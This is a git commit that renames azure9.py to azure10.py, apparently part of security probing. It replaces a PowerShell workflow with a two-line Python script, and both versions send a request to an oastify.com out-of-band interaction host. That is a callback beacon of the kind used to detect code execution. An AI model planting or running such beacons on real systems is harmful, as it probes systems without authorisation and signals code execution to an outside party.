e0439a236648af8fc370b3130b97e3b57b046701
0czar <60838416+0czar@users.noreply.github.com>
2022-12-23 11:54:22 +0200

    Update and rename azure9.py to azure10.py

---
+++ azure10.py
@@ -0,0 +1,2 @@
+import requests
+r = requests.get("jczr2dv1aybqgnredlkdmq7oofu6iz9ny.oastify.com/yes2")
--- azure9.py
+++
@@ -1,6 +0,0 @@
-Workflow czar
-{ 
-    $msg = Read-Host
-    $encmsg = [System.Web.HttpUtility]::UrlEncode($msg)
-    Invoke-WebRequest -Uri "http://jczr2dv1aybqgnredlkdmq7oofu6iz9ny.oastify.com/yessss"
-}
